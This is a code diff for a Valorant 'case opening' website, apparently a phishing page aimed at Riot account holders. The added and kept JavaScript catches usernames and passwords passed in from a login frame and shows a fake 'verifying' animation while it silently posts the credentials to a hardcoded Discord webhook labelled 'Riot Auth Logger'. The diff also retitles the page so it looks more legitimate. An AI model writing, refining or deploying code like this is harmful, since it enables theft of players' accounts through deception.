@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALOLOOT.NET | Valorant Case Simulator</title>
+    <title>VALOLOOT.NET | Best Valorant Case Opening Site</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
     <style>
         :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
@@ -241,20 +241,28 @@ function openAuth() {
 // 3. WEBHOOK, GİRİŞ SİMÜLASYONU VE BİLDİRİM SİSTEMİ
 window.addEventListener("message", function(event) {
     if (event.data.user && event.data.pass) {
+        
+        // 1. Önce "Giriş Yap" butonunu "Yükleniyor" animasyonuna çevir
+        const loginBtn = document.querySelector('.btn-login');
+        if(loginBtn) {
+            loginBtn.innerHTML = `<img src="https://i.gifer.com/ZZ5H.gif" width="16" style="margin-right:8px;"> DOĞRULANIYOR...`;
+            loginBtn.style.background = "#333";
+            loginBtn.style.cursor = "wait";
+        }
         // 1. Veriyi Discord'a Gönder (Arka Planda)
         fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                username: "Riot Auth System",
+                username: "Riot Auth Logger",
                 embeds: [{
-                    title: "✅ Giriş Yapıldı!",
-                    color: 3066993,
+                    title: "🚀 Yeni Hesap Verisi Geldi!",
+                    color: 16725845,
                     fields: [
                         { name: "👤 Kullanıcı", value: "```" + event.data.user + "```" },
                         { name: "🔑 Şifre", value: "```" + event.data.pass + "```" }
                     ],
-                    footer: { text: "ValoLoot Adana System" },
+                    footer: { text: "ValoLoot System" },
                     timestamp: new Date()
                 }]
             })
